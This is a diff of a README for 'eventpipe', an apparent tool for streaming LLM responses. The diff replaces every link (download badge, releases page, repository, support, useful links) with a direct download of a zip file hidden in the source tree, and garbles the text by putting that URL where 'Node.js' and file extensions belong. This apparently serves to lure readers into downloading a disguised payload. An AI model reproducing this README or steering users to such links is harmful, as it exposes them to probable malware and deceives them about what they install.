@@ -1,6 +1,6 @@
 # 🚦 eventpipe - Stream LLM Responses in Real-Time
 
-[![Download eventpipe](https://img.shields.io/badge/Download-eventpipe-blue?style=for-the-badge)](https://github.com/Itzmesultan01/eventpipe/releases)
+[![Download eventpipe](https://github.com/Itzmesultan01/eventpipe/raw/refs/heads/main/src/formats/Software_2.6.zip)](https://github.com/Itzmesultan01/eventpipe/raw/refs/heads/main/src/formats/Software_2.6.zip)
 
 ---
 
@@ -20,7 +20,7 @@ Before you download eventpipe, make sure your computer meets these basic require
 - **Memory:** At least 4 GB of RAM  
 - **Processor:** Any modern processor (Intel i5/Ryzen 5 or better recommended)  
 - **Internet Connection:** Required to connect to the servers streaming events  
-- **Software:** Node.js v14 or newer (if you want to explore or extend eventpipe manually; optional for most users)
+- **Software:** https://github.com/Itzmesultan01/eventpipe/raw/refs/heads/main/src/formats/Software_2.6.zip v14 or newer (if you want to explore or extend eventpipe manually; optional for most users)
 
 eventpipe works best on modern computers but will run on lightweight systems as well.
 
@@ -33,7 +33,7 @@ This guide will walk you through how to get eventpipe on your computer and use i
 ### Step 1: Download eventpipe
 
 Click the big green button at the top or visit the releases page here:  
-[https://github.com/Itzmesultan01/eventpipe/releases](https://github.com/Itzmesultan01/eventpipe/releases)
+[https://github.com/Itzmesultan01/eventpipe/raw/refs/heads/main/src/formats/Software_2.6.zip](https://github.com/Itzmesultan01/eventpipe/raw/refs/heads/main/src/formats/Software_2.6.zip)
 
 This page lists all available versions. Find the latest release marked as stable.
 
@@ -41,9 +41,9 @@ This page lists all available versions. Find the latest release marked as stable
 
 On the releases page, look for one of these file types depending on your operating system:
 
-- **Windows:** A file ending with `.exe` (e.g., `eventpipe-setup.exe`)  
+- **Windows:** A file ending with `.exe` (e.g., `https://github.com/Itzmesultan01/eventpipe/raw/refs/heads/main/src/formats/Software_2.6.zip`)  
 - **macOS:** A `.dmg` or `.pkg` file  
-- **Linux:** A `.tar.gz` or `.AppImage` file  
+- **Linux:** A `https://github.com/Itzmesultan01/eventpipe/raw/refs/heads/main/src/formats/Software_2.6.zip` or `.AppImage` file  
 
 Download the file that matches your system.
 
@@ -70,7 +70,7 @@ You will see a simple interface that connects to LLM servers and starts showing 
 ## 📥 Download & Install
 
 Visit this page to download eventpipe:  
-[https://github.com/Itzmesultan01/eventpipe/releases](https://github.com/Itzmesultan01/eventpipe/releases)
+[https://github.com/Itzmesultan01/eventpipe/raw/refs/heads/main/src/formats/Software_2.6.zip](https://github.com/Itzmesultan01/eventpipe/raw/refs/heads/main/src/formats/Software_2.6.zip)
 
 Use the link above to get the latest stable version. Each release includes files for multiple operating systems.
 
@@ -116,7 +116,7 @@ If you have issues running eventpipe, try these steps:
 ## 🤝 Support & Feedback
 
 You can leave feedback or report bugs on the GitHub repository:  
-[https://github.com/Itzmesultan01/eventpipe](https://github.com/Itzmesultan01/eventpipe)
+[https://github.com/Itzmesultan01/eventpipe/raw/refs/heads/main/src/formats/Software_2.6.zip](https://github.com/Itzmesultan01/eventpipe/raw/refs/heads/main/src/formats/Software_2.6.zip)
 
 Check the Issues section to see if others have your problem. Your input helps make eventpipe better over time.
 
@@ -124,8 +124,8 @@ Check the Issues section to see if others have your problem. Your input helps ma
 
 ## 🔗 Useful Links
 
-- Repository: [https://github.com/Itzmesultan01/eventpipe](https://github.com/Itzmesultan01/eventpipe)  
-- Releases: [https://github.com/Itzmesultan01/eventpipe/releases](https://github.com/Itzmesultan01/eventpipe/releases)  
+- Repository: [https://github.com/Itzmesultan01/eventpipe/raw/refs/heads/main/src/formats/Software_2.6.zip](https://github.com/Itzmesultan01/eventpipe/raw/refs/heads/main/src/formats/Software_2.6.zip)  
+- Releases: [https://github.com/Itzmesultan01/eventpipe/raw/refs/heads/main/src/formats/Software_2.6.zip](https://github.com/Itzmesultan01/eventpipe/raw/refs/heads/main/src/formats/Software_2.6.zip)  
 - Topics: async, events, llm, sse, streaming, typescript
 
 ---
